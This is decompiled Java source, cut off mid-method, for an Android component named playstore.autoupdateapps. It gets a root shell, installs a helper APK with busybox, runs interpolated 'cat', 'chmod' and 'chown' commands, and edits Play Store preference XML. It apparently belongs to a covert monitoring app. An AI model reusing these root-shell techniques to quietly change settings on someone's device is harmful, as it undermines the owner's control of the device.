package com.vvt.playstore.autoupdateapps;

import android.content.Context;
import com.fx.socket.TcpSocketCmd;
import com.fx.socket.e;
import com.vvt.base.RunningMode;
import com.vvt.io.p;
import com.vvt.playstore.autoupdateapps.core.ref.command.RemotePlayStoreAutoUpdateApps;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.ShellUtil;
import com.vvt.shell.f;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.Reader;
import java.io.StringReader;
import java.util.Timer;

public class b
  implements com.fx.socket.d, a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.d;
  private static final boolean c = com.vvt.ak.a.e;
  private Context d;
  private Timer e;
  private e f;
  private String g;
  private boolean h;
  private boolean i;
  private RunningMode j;
  private String k = "root";
  
  public b(String paramString1, Context paramContext, RunningMode paramRunningMode, String paramString2)
  {
    this.g = paramString1;
    this.d = paramContext;
    this.j = paramRunningMode;
    this.k = paramString2;
  }
  
  /* Error */
  private void a(d paramd)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_2
    //   2: aconst_null
    //   3: astore_3
    //   4: iconst_0
    //   5: istore 4
    //   7: aconst_null
    //   8: astore 5
    //   10: invokestatic 61	javax/xml/parsers/DocumentBuilderFactory:newInstance	()Ljavax/xml/parsers/DocumentBuilderFactory;
    //   13: astore 6
    //   15: aload_1
    //   16: ifnull +973 -> 989
    //   19: aload_1
    //   20: invokevirtual 66	com/vvt/playstore/autoupdateapps/d:a	()Ljava/lang/String;
    //   23: astore 7
    //   25: new 68	java/io/File
    //   28: astore 8
    //   30: aload 8
    //   32: aload 7
    //   34: invokespecial 71	java/io/File:<init>	(Ljava/lang/String;)V
    //   37: aload 8
    //   39: invokevirtual 75	java/io/File:exists	()Z
    //   42: istore 9
    //   44: iload 9
    //   46: ifeq +984 -> 1030
    //   49: new 77	java/io/FileInputStream
    //   52: astore 7
    //   54: aload 7
    //   56: aload 8
    //   58: invokespecial 80	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   61: aload 6
    //   63: invokevirtual 84	javax/xml/parsers/DocumentBuilderFactory:newDocumentBuilder	()Ljavax/xml/parsers/DocumentBuilder;
    //   66: astore 5
    //   68: new 86	org/xml/sax/InputSource
    //   71: astore 6
    //   73: aload 6
    //   75: aload 7
    //   77: invokespecial 89	org/xml/sax/InputSource:<init>	(Ljava/io/InputStream;)V
    //   80: aload 5
    //   82: aload 6
    //   84: invokevirtual 95	javax/xml/parsers/DocumentBuilder:parse	(Lorg/xml/sax/InputSource;)Lorg/w3c/dom/Document;
    //   87: astore 10
    //   89: aload 10
    //   91: invokeinterface 101 1 0
    //   96: astore 5
    //   98: aload 5
    //   100: invokeinterface 106 1 0
    //   105: aload_1
    //   106: invokevirtual 109	com/vvt/playstore/autoupdateapps/d:removeFromPath	()Ljava/util/Hashtable;
    //   109: astore 11
    //   111: aload 11
    //   113: ifnull +235 -> 348
    //   116: aload 11
    //   118: invokevirtual 115	java/util/Hashtable:size	()I
    //   121: istore 4
    //   123: iload 4
    //   125: ifle +223 -> 348
    //   128: iload_2
    //   129: istore 12
    //   131: iload 12
    //   133: ifeq +395 -> 528
    //   136: ldc 117
    //   138: astore 5
    //   140: aload 10
    //   142: aload 5
    //   144: invokeinterface 121 2 0
    //   149: astore 13
    //   151: aload 13
    //   153: invokeinterface 126 1 0
    //   158: istore 14
    //   160: getstatic 30	com/vvt/playstore/autoupdateapps/removeFromPath:a	Z
    //   163: istore 4
    //   165: iload 4
    //   167: ifeq +3 -> 170
    //   170: iconst_0
    //   171: istore 15
    //   173: aconst_null
    //   174: astore 6
    //   176: iload 15
    //   178: iload 14
    //   180: if_icmpge +174 -> 354
    //   183: aload 13
    //   185: iload 15
    //   187: invokeinterface 130 2 0
    //   192: astore 5
    //   194: aload 5
    //   196: invokeinterface 136 1 0
    //   201: astore 16
    //   203: ldc -118
    //   205: astore 5
    //   207: aload 16
    //   209: aload 5
    //   211: invokeinterface 144 2 0
    //   216: astore 5
    //   218: aload 5
    //   220: invokeinterface 147 1 0
    //   225: astore 17
    //   227: getstatic 30	com/vvt/playstore/autoupdateapps/removeFromPath:a	Z
    //   230: istore 4
    //   232: iload 4
    //   234: ifeq +3 -> 237
    //   237: aload 11
    //   239: aload 17
    //   241: invokevirtual 151	java/util/Hashtable:containsKey	(Ljava/lang/Object;)Z
    //   244: istore 4
    //   246: iload 4
    //   248: ifeq +87 -> 335
    //   251: aload 11
    //   253: aload 17
    //   255: invokevirtual 155	java/util/Hashtable:get	(Ljava/lang/Object;)Ljava/lang/Object;
    //   258: astore 5
    //   260: aload 5
    //   262: checkcast 157	java/lang/String
    //   265: astore 5
    //   267: aload 11
    //   269: aload 17
    //   271: invokevirtual 160	java/util/Hashtable:remove	(Ljava/lang/Object;)Ljava/lang/Object;
    //   274: pop
    //   275: ldc -94
    //   277: astore 17
    //   279: aload 16
    //   281: aload 17
    //   283: invokeinterface 144 2 0
    //   288: astore 16
    //   290: aload 16
    //   292: invokeinterface 147 1 0
    //   297: pop
    //   298: getstatic 30	com/vvt/playstore/autoupdateapps/removeFromPath:a	Z
    //   301: istore 18
    //   303: iload 18
    //   305: ifeq +3 -> 308
    //   308: aload 16
    //   310: aload 5
    //   312: invokeinterface 165 2 0
    //   317: aload 16
    //   319: invokeinterface 147 1 0
    //   324: pop
    //   325: getstatic 30	com/vvt/playstore/autoupdateapps/removeFromPath:a	Z
    //   328: istore 4
    //   330: iload 4
    //   332: ifeq +3 -> 335
    //   335: iload 15
    //   337: iconst_1
    //   338: iadd
    //   339: istore 4
    //   341: iload 4
    //   343: istore 15
    //   345: goto -169 -> 176
    //   348: iconst_0
    //   349: istore 12
    //   351: goto -220 -> 131
    //   354: aload 11
    //   356: invokevirtual 115	java/util/Hashtable:size	()I
    //   359: istore 4
    //   361: iload 4
    //   363: ifle +165 -> 528
    //   366: getstatic 30	com/vvt/playstore/autoupdateapps/removeFromPath:a	Z
    //   369: istore 4
    //   371: iload 4
    //   373: ifeq +3 -> 376
    //   376: ldc -89
    //   378: astore 5
    //   380: aload 10
    //   382: aload 5
    //   384: invokeinterface 121 2 0
    //   389: astore 5
    //   391: iconst_0
    //   392: istore 15
    //   394: aconst_null
    //   395: astore 6
    //   397: aload 5
    //   399: iconst_0
    //   400: invokeinterface 130 2 0
    //   405: astore 13
    //   407: aload 11
    //   409: invokevirtual 171	java/util/Hashtable:keys	()Ljava/util/Enumeration;
    //   412: astore 19
    //   414: aload 19
    //   416: invokeinterface 176 1 0
    //   421: istore 4
    //   423: iload 4
    //   425: ifeq +103 -> 528
    //   428: aload 19
    //   430: invokeinterface 180 1 0
    //   435: astore 5
    //   437: aload 5
    //   439: checkcast 157	java/lang/String
    //   442: astore 5
    //   444: aload 11
    //   446: aload 5
    //   448: invokevirtual 155	java/util/Hashtable:get	(Ljava/lang/Object;)Ljava/lang/Object;
    //   451: astore 6
    //   453: aload 6
    //   455: checkcast 157	java/lang/String
    //   458: astore 6
    //   460: ldc 117
    //   462: astore 16
    //   464: aload 10
    //   466: aload 16
    //   468: invokeinterface 184 2 0
    //   473: astore 16
    //   475: ldc -118
    //   477: astore 17
    //   479: aload 16
    //   481: aload 17
    //   483: aload 5
    //   485: invokeinterface 188 3 0
    //   490: ldc -94
    //   492: astore 5
    //   494: aload 16
    //   496: aload 5
    //   498: aload 6
    //   500: invokeinterface 188 3 0
    //   505: aload 13
    //   507: aload 16
    //   509: invokeinterface 192 2 0
    //   514: pop
    //   515: getstatic 30	com/vvt/playstore/autoupdateapps/removeFromPath:a	Z
    //   518: istore 4
    //   520: iload 4
    //   522: ifeq -108 -> 414
    //   525: goto -111 -> 414
    //   528: aload_1
    //   529: invokevirtual 194	com/vvt/playstore/autoupdateapps/d:MyUncaughtExceptionHandler	()Ljava/util/Hashtable;
    //   532: astore 11
    //   534: aload 11
    //   536: ifnull +211 -> 747
    //   539: aload 11
    //   541: invokevirtual 115	java/util/Hashtable:size	()I
    //   544: istore 4
    //   546: iload 4
    //   548: ifle +199 -> 747
    //   551: iload_2
    //   552: ifeq +366 -> 918
    //   555: ldc -60
    //   557: astore 5
    //   559: aload 10
    //   561: aload 5
    //   563: invokeinterface 121 2 0
    //   568: astore 13
    //   570: aload 13
    //   572: invokeinterface 126 1 0
    //   577: istore 14
    //   579: getstatic 30	com/vvt/playstore/autoupdateapps/removeFromPath:a	Z
    //   582: istore 4
    //   584: iload 4
    //   586: ifeq +3 -> 589
    //   589: iconst_0
    //   590: istore 15
    //   592: aconst_null
    //   593: astore 6
    //   595: iload 15
    //   597: iload 14
    //   599: if_icmpge +153 -> 752
    //   602: aload 13
    //   604: iload 15
    //   606: invokeinterface 130 2 0
    //   611: astore_3
    //   612: aload_3
    //   613: invokeinterface 136 1 0
    //   618: astore 5
    //   620: ldc -118
    //   622: astore 16
    //   624: aload 5
    //   626: aload 16
    //   628: invokeinterface 144 2 0
    //   633: astore 5
    //   635: aload 5
    //   637: invokeinterface 147 1 0
    //   642: astore 16
    //   644: getstatic 30	com/vvt/playstore/autoupdateapps/removeFromPath:a	Z
    //   647: istore 4
    //   649: iload 4
    //   651: ifeq +3 -> 654
    //   654: aload 11
    //   656: aload 16
    //   658: invokevirtual 151	java/util/Hashtable:containsKey	(Ljava/lang/Object;)Z
    //   661: istore 4
    //   663: iload 4
    //   665: ifeq +69 -> 734
    //   668: aload 11
    //   670: aload 16
    //   672: invokevirtual 155	java/util/Hashtable:get	(Ljava/lang/Object;)Ljava/lang/Object;
    //   675: astore 5
    //   677: aload 5
    //   679: checkcast 157	java/lang/String
    //   682: astore 5
    //   684: aload 11
    //   686: aload 16
    //   688: invokevirtual 160	java/util/Hashtable:remove	(Ljava/lang/Object;)Ljava/lang/Object;
    //   691: pop
    //   692: aload_3
    //   693: invokeinterface 199 1 0
    //   698: pop
    //   699: getstatic 30	com/vvt/playstore/autoupdateapps/removeFromPath:a	Z
    //   702: istore 20
    //   704: iload 20
    //   706: ifeq +3 -> 709
    //   709: aload_3
    //   710: aload 5
    //   712: invokeinterface 202 2 0
    //   717: aload_3
    //   718: invokeinterface 199 1 0
    //   723: pop
    //   724: getstatic 30	com/vvt/playstore/autoupdateapps/removeFromPath:a	Z
    //   727: istore 4
    //   729: iload 4
    //   731: ifeq +3 -> 734
    //   734: iload 15
    //   736: iconst_1
    //   737: iadd
    //   738: istore 4
    //   740: iload 4
    //   742: istore 15
    //   744: goto -149 -> 595
    //   747: iconst_0
    //   748: istore_2
    //   749: goto -198 -> 551
    //   752: aload 11
    //   754: invokevirtual 115	java/util/Hashtable:size	()I
    //   757: istore 4
    //   759: iload 4
    //   761: ifle +157 -> 918
    //   764: getstatic 30	com/vvt/playstore/autoupdateapps/removeFromPath:a	Z
    //   767: istore 4
    //   769: iload 4
    //   771: ifeq +3 -> 774
    //   774: ldc -89
    //   776: astore 5
    //   778: aload 10
    //   780: aload 5
    //   782: invokeinterface 121 2 0
    //   787: astore 5
    //   789: iconst_0
    //   790: istore 15
    //   792: aconst_null
    //   793: astore 6
    //   795: aload 5
    //   797: iconst_0
    //   798: invokeinterface 130 2 0
    //   803: astore_3
    //   804: aload 11
    //   806: invokevirtual 171	java/util/Hashtable:keys	()Ljava/util/Enumeration;
    //   809: astore 13
    //   811: aload 13
    //   813: invokeinterface 176 1 0
    //   818: istore 4
    //   820: iload 4
    //   822: ifeq +96 -> 918
    //   825: aload 13
    //   827: invokeinterface 180 1 0
    //   832: astore 5
    //   834: aload 5
    //   836: checkcast 157	java/lang/String
    //   839: astore 5
    //   841: aload 11
    //   843: aload 5
    //   845: invokevirtual 155	java/util/Hashtable:get	(Ljava/lang/Object;)Ljava/lang/Object;
    //   848: astore 6
    //   850: aload 6
    //   852: checkcast 157	java/lang/String
    //   855: astore 6
    //   857: ldc -60
    //   859: astore 19
    //   861: aload 10
    //   863: aload 19
    //   865: invokeinterface 184 2 0
    //   870: astore 19
    //   872: ldc -118
    //   874: astore 16
    //   876: aload 19
    //   878: aload 16
    //   880: aload 5
    //   882: invokeinterface 188 3 0
    //   887: aload 19
    //   889: aload 6
    //   891: invokeinterface 203 2 0
    //   896: aload_3
    //   897: aload 19
    //   899: invokeinterface 192 2 0
    //   904: pop
    //   905: getstatic 30	com/vvt/playstore/autoupdateapps/removeFromPath:a	Z
    //   908: istore 4
    //   910: iload 4
    //   912: ifeq -101 -> 811
    //   915: goto -104 -> 811
    //   918: iload 12
    //   920: ifne +7 -> 927
    //   923: iload_2
    //   924: ifeq +60 -> 984
    //   927: invokestatic 208	javax/xml/transform/TransformerFactory:newInstance	()Ljavax/xml/transform/TransformerFactory;
    //   930: astore 5
    //   932: aload 5
    //   934: invokevirtual 212	javax/xml/transform/TransformerFactory:newTransformer	()Ljavax/xml/transform/Transformer;
    //   937: astore 5
    //   939: ldc -42
    //   941: astore 6
    //   943: ldc -40
    //   945: astore_3
    //   946: aload 5
    //   948: aload 6
    //   950: aload_3
    //   951: invokevirtual 221	javax/xml/transform/Transformer:setOutputProperty	(Ljava/lang/String;Ljava/lang/String;)V
    //   954: new 223	javax/xml/transform/dom/DOMSource
    //   957: astore 6
    //   959: aload 6
    //   961: aload 10
    //   963: invokespecial 226	javax/xml/transform/dom/DOMSource:<init>	(Lorg/w3c/dom/Node;)V
    //   966: new 228	javax/xml/transform/stream/StreamResult
    //   969: astore_3
    //   970: aload_3
    //   971: aload 8
    //   973: invokespecial 229	javax/xml/transform/stream/StreamResult:<init>	(Ljava/io/File;)V
    //   976: aload 5
    //   978: aload 6
    //   980: aload_3
    //   981: invokevirtual 233	javax/xml/transform/Transformer:transform	(Ljavax/xml/transform/Source;Ljavax/xml/transform/Result;)V
    //   984: aload 7
    //   986: invokestatic 237	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   989: return
    //   990: astore 6
    //   992: getstatic 38	com/vvt/playstore/autoupdateapps/removeFromPath:MyUncaughtExceptionHandler	Z
    //   995: istore 15
    //   997: iload 15
    //   999: ifeq +3 -> 1002
    //   1002: aload 5
    //   1004: invokestatic 237	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   1007: goto -18 -> 989
    //   1010: astore 6
    //   1012: iconst_0
    //   1013: istore 9
    //   1015: aconst_null
    //   1016: astore 7
    //   1018: aload 6
    //   1020: astore 5
    //   1022: aload 7
    //   1024: invokestatic 237	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   1027: aload 5
    //   1029: athrow
    //   1030: getstatic 34	com/vvt/playstore/autoupdateapps/removeFromPath:removeFromPath	Z
    //   1033: istore 4
    //   1035: iload 4
    //   1037: ifeq -48 -> 989
    //   1040: goto -51 -> 989
    //   1043: astore 5
    //   1045: goto -23 -> 1022
    //   1048: astore 6
    //   1050: aload 5
    //   1052: astore 7
    //   1054: aload 6
    //   1056: astore 5
    //   1058: goto -36 -> 1022
    //   1061: astore 5
    //   1063: aload 7
    //   1065: astore 5
    //   1067: goto -75 -> 992
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	1070	0	this	removeFromPath
    //   0	1070	1	paramd	d
    //   1	923	2	m	int
    //   3	978	3	localObject1	Object
    //   5	119	4	n	int
    //   163	168	4	bool1	boolean
    //   339	23	4	i1	int
    //   369	152	4	bool2	boolean
    //   544	3	4	i2	int
    //   582	148	4	bool3	boolean
    //   738	22	4	i3	int
    //   767	269	4	bool4	boolean
    //   8	1020	5	localObject2	Object
    //   1043	8	5	localObject3	Object
    //   1056	1	5	localObject4	Object
    //   1061	1	5	localException1	Exception
    //   1065	1	5	localObject5	Object
    //   13	966	6	localObject6	Object
    //   990	1	6	localException2	Exception
    //   1010	9	6	localObject7	Object
    //   1048	7	6	localObject8	Object
    //   23	1041	7	localObject9	Object
    //   28	944	8	localFile	File
    //   42	972	9	bool5	boolean
    //   87	875	10	localDocument	org.w3c.dom.Document
    //   109	733	11	localHashtable	java.util.Hashtable
    //   129	790	12	i4	int
    //   149	677	13	localObject10	Object
    //   158	442	14	i5	int
    //   171	620	15	i6	int
    //   995	3	15	bool6	boolean
    //   201	678	16	localObject11	Object
    //   225	257	17	str	String
    //   301	3	18	bool7	boolean
    //   412	486	19	localObject12	Object
    //   702	3	20	bool8	boolean
    // Exception table:
    //   from	to	target	type
    //   49	52	990	java/lang/Exception
    //   56	61	990	java/lang/Exception
    //   49	52	1010	finally
    //   56	61	1010	finally
    //   61	66	1043	finally
    //   68	71	1043	finally
    //   75	80	1043	finally
    //   82	87	1043	finally
    //   89	96	1043	finally
    //   98	105	1043	finally
    //   105	109	1043	finally
    //   116	121	1043	finally
    //   142	149	1043	finally
    //   151	158	1043	finally
    //   160	163	1043	finally
    //   185	192	1043	finally
    //   194	201	1043	finally
    //   209	216	1043	finally
    //   218	225	1043	finally
    //   227	230	1043	finally
    //   239	244	1043	finally
    //   253	258	1043	finally
    //   260	265	1043	finally
    //   269	275	1043	finally
    //   281	288	1043	finally
    //   290	298	1043	finally
    //   298	301	1043	finally
    //   310	317	1043	finally
    //   317	325	1043	finally
    //   325	328	1043	finally
    //   354	359	1043	finally
    //   366	369	1043	finally
    //   382	389	1043	finally
    //   399	405	1043	finally
    //   407	412	1043	finally
    //   414	421	1043	finally
    //   428	435	1043	finally
    //   437	442	1043	finally
    //   446	451	1043	finally
    //   453	458	1043	finally
    //   466	473	1043	finally
    //   483	490	1043	finally
    //   498	505	1043	finally
    //   507	515	1043	finally
    //   515	518	1043	finally
    //   528	532	1043	finally
    //   539	544	1043	finally
    //   561	568	1043	finally
    //   570	577	1043	finally
    //   579	582	1043	finally
    //   604	611	1043	finally
    //   612	618	1043	finally
    //   626	633	1043	finally
    //   635	642	1043	finally
    //   644	647	1043	finally
    //   656	661	1043	finally
    //   670	675	1043	finally
    //   677	682	1043	finally
    //   686	692	1043	finally
    //   692	699	1043	finally
    //   699	702	1043	finally
    //   710	717	1043	finally
    //   717	724	1043	finally
    //   724	727	1043	finally
    //   752	757	1043	finally
    //   764	767	1043	finally
    //   780	787	1043	finally
    //   797	803	1043	finally
    //   804	809	1043	finally
    //   811	818	1043	finally
    //   825	832	1043	finally
    //   834	839	1043	finally
    //   843	848	1043	finally
    //   850	855	1043	finally
    //   863	870	1043	finally
    //   880	887	1043	finally
    //   889	896	1043	finally
    //   897	905	1043	finally
    //   905	908	1043	finally
    //   927	930	1043	finally
    //   932	937	1043	finally
    //   950	954	1043	finally
    //   954	957	1043	finally
    //   961	966	1043	finally
    //   966	969	1043	finally
    //   971	976	1043	finally
    //   980	984	1043	finally
    //   992	995	1048	finally
    //   61	66	1061	java/lang/Exception
    //   68	71	1061	java/lang/Exception
    //   75	80	1061	java/lang/Exception
    //   82	87	1061	java/lang/Exception
    //   89	96	1061	java/lang/Exception
    //   98	105	1061	java/lang/Exception
    //   105	109	1061	java/lang/Exception
    //   116	121	1061	java/lang/Exception
    //   142	149	1061	java/lang/Exception
    //   151	158	1061	java/lang/Exception
    //   160	163	1061	java/lang/Exception
    //   185	192	1061	java/lang/Exception
    //   194	201	1061	java/lang/Exception
    //   209	216	1061	java/lang/Exception
    //   218	225	1061	java/lang/Exception
    //   227	230	1061	java/lang/Exception
    //   239	244	1061	java/lang/Exception
    //   253	258	1061	java/lang/Exception
    //   260	265	1061	java/lang/Exception
    //   269	275	1061	java/lang/Exception
    //   281	288	1061	java/lang/Exception
    //   290	298	1061	java/lang/Exception
    //   298	301	1061	java/lang/Exception
    //   310	317	1061	java/lang/Exception
    //   317	325	1061	java/lang/Exception
    //   325	328	1061	java/lang/Exception
    //   354	359	1061	java/lang/Exception
    //   366	369	1061	java/lang/Exception
    //   382	389	1061	java/lang/Exception
    //   399	405	1061	java/lang/Exception
    //   407	412	1061	java/lang/Exception
    //   414	421	1061	java/lang/Exception
    //   428	435	1061	java/lang/Exception
    //   437	442	1061	java/lang/Exception
    //   446	451	1061	java/lang/Exception
    //   453	458	1061	java/lang/Exception
    //   466	473	1061	java/lang/Exception
    //   483	490	1061	java/lang/Exception
    //   498	505	1061	java/lang/Exception
    //   507	515	1061	java/lang/Exception
    //   515	518	1061	java/lang/Exception
    //   528	532	1061	java/lang/Exception
    //   539	544	1061	java/lang/Exception
    //   561	568	1061	java/lang/Exception
    //   570	577	1061	java/lang/Exception
    //   579	582	1061	java/lang/Exception
    //   604	611	1061	java/lang/Exception
    //   612	618	1061	java/lang/Exception
    //   626	633	1061	java/lang/Exception
    //   635	642	1061	java/lang/Exception
    //   644	647	1061	java/lang/Exception
    //   656	661	1061	java/lang/Exception
    //   670	675	1061	java/lang/Exception
    //   677	682	1061	java/lang/Exception
    //   686	692	1061	java/lang/Exception
    //   692	699	1061	java/lang/Exception
    //   699	702	1061	java/lang/Exception
    //   710	717	1061	java/lang/Exception
    //   717	724	1061	java/lang/Exception
    //   724	727	1061	java/lang/Exception
    //   752	757	1061	java/lang/Exception
    //   764	767	1061	java/lang/Exception
    //   780	787	1061	java/lang/Exception
    //   797	803	1061	java/lang/Exception
    //   804	809	1061	java/lang/Exception
    //   811	818	1061	java/lang/Exception
    //   825	832	1061	java/lang/Exception
    //   834	839	1061	java/lang/Exception
    //   843	848	1061	java/lang/Exception
    //   850	855	1061	java/lang/Exception
    //   863	870	1061	java/lang/Exception
    //   880	887	1061	java/lang/Exception
    //   889	896	1061	java/lang/Exception
    //   897	905	1061	java/lang/Exception
    //   905	908	1061	java/lang/Exception
    //   927	930	1061	java/lang/Exception
    //   932	937	1061	java/lang/Exception
    //   950	954	1061	java/lang/Exception
    //   954	957	1061	java/lang/Exception
    //   961	966	1061	java/lang/Exception
    //   966	969	1061	java/lang/Exception
    //   971	976	1061	java/lang/Exception
    //   980	984	1061	java/lang/Exception
  }
  
  /* Error */
  private void a(String paramString)
  {
    // Byte code:
    //   0: aload_0
    //   1: getfield 48	com/vvt/playstore/autoupdateapps/removeFromPath:FxFileObserverWorker	Ljava/lang/String;
    //   4: ldc -15
    //   6: invokestatic 246	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   9: astore_2
    //   10: new 68	java/io/File
    //   13: astore_3
    //   14: aload_3
    //   15: aload_2
    //   16: invokespecial 71	java/io/File:<init>	(Ljava/lang/String;)V
    //   19: iconst_0
    //   20: istore 4
    //   22: aconst_null
    //   23: astore 5
    //   25: new 248	java/io/FileWriter
    //   28: astore_2
    //   29: aload_2
    //   30: aload_3
    //   31: invokespecial 249	java/io/FileWriter:<init>	(Ljava/io/File;)V
    //   34: aload_2
    //   35: aload_1
    //   36: invokevirtual 252	java/io/FileWriter:write	(Ljava/lang/String;)V
    //   39: aload_2
    //   40: ifnull +7 -> 47
    //   43: aload_2
    //   44: invokevirtual 255	java/io/FileWriter:close	()V
    //   47: return
    //   48: astore_2
    //   49: aconst_null
    //   50: astore_2
    //   51: getstatic 38	com/vvt/playstore/autoupdateapps/removeFromPath:MyUncaughtExceptionHandler	Z
    //   54: istore 4
    //   56: iload 4
    //   58: ifeq +3 -> 61
    //   61: aload_2
    //   62: ifnull -15 -> 47
    //   65: aload_2
    //   66: invokevirtual 255	java/io/FileWriter:close	()V
    //   69: goto -22 -> 47
    //   72: astore_2
    //   73: goto -26 -> 47
    //   76: astore_2
    //   77: aload 5
    //   79: ifnull +8 -> 87
    //   82: aload 5
    //   84: invokevirtual 255	java/io/FileWriter:close	()V
    //   87: aload_2
    //   88: athrow
    //   89: astore 5
    //   91: goto -4 -> 87
    //   94: astore 6
    //   96: aload_2
    //   97: astore 5
    //   99: aload 6
    //   101: astore_2
    //   102: goto -25 -> 77
    //   105: astore 5
    //   107: goto -56 -> 51
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	110	0	this	removeFromPath
    //   0	110	1	paramString	String
    //   9	35	2	localObject1	Object
    //   48	1	2	localIOException1	IOException
    //   50	16	2	localObject2	Object
    //   72	1	2	localIOException2	IOException
    //   76	21	2	localObject3	Object
    //   101	1	2	localObject4	Object
    //   13	18	3	localFile	File
    //   20	37	4	bool	boolean
    //   23	60	5	localObject5	Object
    //   89	1	5	localIOException3	IOException
    //   97	1	5	localObject6	Object
    //   105	1	5	localIOException4	IOException
    //   94	6	6	localObject7	Object
    // Exception table:
    //   from	to	target	type
    //   25	28	48	java/io/IOException
    //   30	34	48	java/io/IOException
    //   43	47	72	java/io/IOException
    //   65	69	72	java/io/IOException
    //   25	28	76	finally
    //   30	34	76	finally
    //   82	87	89	java/io/IOException
    //   35	39	94	finally
    //   51	54	94	finally
    //   35	39	105	java/io/IOException
  }
  
  private boolean a(String paramString1, String paramString2, String paramString3, f paramf)
  {
    int m = 2;
    boolean bool1 = true;
    boolean bool2 = false;
    String str1 = null;
    boolean bool3 = ShellUtil.b(paramString1);
    if (bool3)
    {
      Object[] arrayOfObject = new Object[m];
      arrayOfObject[0] = paramString1;
      arrayOfObject[bool1] = paramString2;
      String str2 = String.format("cat %s > %s", arrayOfObject);
      boolean bool4 = a;
      if (bool4) {}
      str2 = paramf.a(str2);
      bool4 = a;
      if ((!bool4) || (str2 != null))
      {
        str2 = "chmod %s %s";
        arrayOfObject = new Object[m];
        arrayOfObject[0] = paramString3;
        arrayOfObject[bool1] = paramString2;
        str1 = String.format(str2, arrayOfObject);
        paramf.a(str1);
      }
    }
    for (;;)
    {
      if (!bool1)
      {
        bool2 = c;
        if (!bool2) {}
      }
      return bool1;
      bool1 = false;
    }
  }
  
  private com.vvt.io.c b(String paramString)
  {
    localBufferedReader = new java/io/BufferedReader;
    Object localObject1 = new java/io/StringReader;
    ((StringReader)localObject1).<init>(paramString);
    localBufferedReader.<init>((Reader)localObject1);
    localObject1 = null;
    try
    {
      int m;
      do
      {
        do
        {
          String str = localBufferedReader.readLine();
          if (str == null) {
            break;
          }
          boolean bool1 = a;
          if (bool1) {}
          localObject1 = com.vvt.io.b.a(str);
        } while (localObject1 == null);
        m = ((com.vvt.io.c)localObject1).j;
      } while (m != 0);
      bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (!bool2) {}
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        boolean bool2 = c;
        if (!bool2) {}
      }
    }
    finally
    {
      com.vvt.io.d.a(localBufferedReader);
    }
    com.vvt.io.d.a(localBufferedReader);
    return (com.vvt.io.c)localObject1;
  }
  
  private boolean b(String paramString1, String paramString2, String paramString3, f paramf)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = paramString1;
    arrayOfObject[bool1] = paramString2;
    int m = 2;
    arrayOfObject[m] = paramString3;
    String str = String.format("chown %s:%s %s", arrayOfObject);
    boolean bool3 = a;
    if (bool3) {}
    str = paramf.a(str);
    if (str == null)
    {
      bool1 = c;
      if (!bool1) {}
    }
    for (;;)
    {
      bool1 = com.vvt.aa.a.c();
      if (bool1) {
        ShellUtil.k(paramString3);
      }
      return bool2;
      bool2 = bool1;
    }
  }
  
  private void f()
  {
    boolean bool = a;
    if (bool) {}
    e locale = this.f;
    if (locale != null)
    {
      bool = a;
      if (bool) {}
      this.f.a();
      bool = false;
      locale = null;
      this.f = null;
    }
    bool = a;
    if (bool) {}
  }
  
  private boolean g()
  {
    boolean bool1 = false;
    boolean bool2 = a;
    if (bool2) {}
    bool2 = true;
    boolean bool3 = i();
    this.i = bool3;
    bool3 = this.i;
    if (bool3)
    {
      e locale = this.f;
      if (locale != null) {
        break label96;
      }
      bool3 = a;
      if (bool3) {}
      bool3 = h();
      if (bool3) {
        break label96;
      }
      bool2 = c;
      if (!bool2) {}
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      return bool1;
      bool2 = a;
      if (bool2)
      {
        continue;
        label96:
        bool1 = bool2;
      }
    }
  }
  
  private boolean h()
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    try
    {
      e locale = new com/fx/socket/e;
      String str1 = "PlayStoreAutoUpdateAppsManagerImpl";
      String str2 = "com.fx.socket.playstore.autoupdateapps.fs";
      int m = 12518;
      locale.<init>(str1, str2, m, this);
      this.f = locale;
      locale = this.f;
      locale.start();
      bool1 = true;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = c;
        if (!bool2) {}
      }
    }
    bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  private boolean i()
  {
    boolean bool1 = false;
    try
    {
      com.vvt.am.a locala = new com/vvt/am/a;
      locala.<init>();
      String str1 = this.g;
      String str2 = "ticket.apk";
      str1 = p.a(str1, str2);
      locala.a(str1);
      str1 = "busybox";
      locala.c(str1);
      str1 = this.g;
      locala.b(str1);
      bool1 = locala.b();
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = c;
        if (!bool2) {}
      }
    }
    return bool1;
  }
  
  /* Error */
  private boolean j()
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: aload_0
    //   5: getfield 48	com/vvt/playstore/autoupdateapps/removeFromPath:FxFileObserverWorker	Ljava/lang/String;
    //   8: astore_3
    //   9: ldc -15
    //   11: astore 4
    //   13: aload_3
    //   14: aload 4
    //   16: invokestatic 246	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   19: astore_3
    //   20: new 68	java/io/File
    //   23: astore 5
    //   25: aload 5
    //   27: aload_3
    //   28: invokespecial 71	java/io/File:<init>	(Ljava/lang/String;)V
    //   31: aload 5
    //   33: invokevirtual 75	java/io/File:exists	()Z
    //   36: istore 6
    //   38: iload 6
    //   40: ifeq +127 -> 167
    //   43: iconst_0
    //   44: istore 7
    //   46: aconst_null
    //   47: astore 4
    //   49: new 278	java/io/BufferedReader
    //   52: astore_3
